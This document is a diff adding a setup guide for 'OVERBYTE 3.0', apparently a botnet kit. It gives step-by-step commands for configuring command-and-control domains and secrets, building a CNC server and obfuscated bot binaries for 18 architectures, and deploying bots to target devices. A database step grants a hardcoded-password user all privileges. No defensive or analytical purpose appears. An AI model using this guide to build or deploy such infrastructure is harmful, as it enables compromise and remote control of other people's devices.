@@ -1,0 +1,84 @@
+==================================================
+   OVERBYTE 3.0 Detailed Guide (Detailed Guide)
+==================================================
+
+This document details the installation, setup, build, and operation of OVERBYTE 3.0.
+Questions are at https://t.me/debugginggg ; text @debug_a
+
+1. Preparing a Server Environment (OS: Ubuntu 22.04/24.04)
+--------------------------------------------------
+At the first installation, you must install the compilers and tools required for your system.
+
+   $ chmod +x package.sh build.sh
+   $ ./package.sh
+
+   * Note: Be sure to run the following commands to apply the changed environment variables after the installation is complete.
+   $ source ~/.bashrc
+
+2. Domain and Access Information Settings (Important)
+--------------------------------------------------
+Sets the address, port, and security key that the bot will use to access the server.
+
+   $ cd tools/enc
+   $ cp secrets.example.txt secrets.txt
+   $ nano secrets.txt
+
+   [Example of writing secrets.txt]
+   overbyte.yourdomain.com # line 1: main CNC domain
+   fallback1.yourdomain.com # line 2: backup domain 1
+   fallback2.yourdomain.com # line 3: backup domain 2
+   443 #4 line: CNC port (SSL/TLS recommended)
+   Line 5 of your-very-long-secret-key #—Secret key for mutual authentication (any long string)
+
+   * CAUTION: If the error "does not contain package" occurs when 'go run./enc' is executed, 
+     Instead of running the tool directly, run './build.sh ' in the root directory. 
+     (When running manually: use the 'go run. -secretssecrets.txt' command inside the tools/enc folder)
+
+3. Build Process (Full Build)
+
+// To avoid mysql error, just copy this code ㄱ
+
+
+
+CREATE USER 'server'@'localhost' IDENTIFIED BY 'root@@321!';
+GRANT ALL PRIVILEGES ON *.* TO 'server'@'localhost' WITH GRANT OPTION;
+FLUSH PRIVILEGES;
+exit;
+
+sudo systemctl restart mysql
+--------------------------------------------------
+Build bots for CNC servers and all architectures using build.sh in the root directory.
+
+   $ ./build.sh --release
+
+   During this process, the following tasks are performed automatically:
+   - Go-based CNC server build (~/server file generation)
+   - Bot build for 18 architectures (~/release/bins/folders)
+   - Binary compression (BLZ) and obfuscation processing
+   - Automatic update of config/config.json
+
+4. Running a service and setting up a database
+--------------------------------------------------
+When the build is complete, run the CNC server.
+
+   A. Load environment variables (Must use export)
+      $ source .env.cnc
+      * Note: The .env.cnc file now includes the 'export' keyword so the server process can read them.
+      * Make sure you are sourcing the correct file path (e.g., source ~/.env.cnc if you are in a different folder).
+
+   B. Check the database
+      - Make sure MariaDB/MySQL is running.
+      - The DB user (server) and password (overbyte) listed in .env.cnc must match the DB settings.
+
+   C. Run the CNC server
+      $ cd ~/
+      $ ./server
+
+5. Bot Deployment
+--------------------------------------------------
+Built bot binaries are located in the following path:
+~/release/bins/
+
+Deploy and run a binary for each environment on the target device.
+
+==================================================
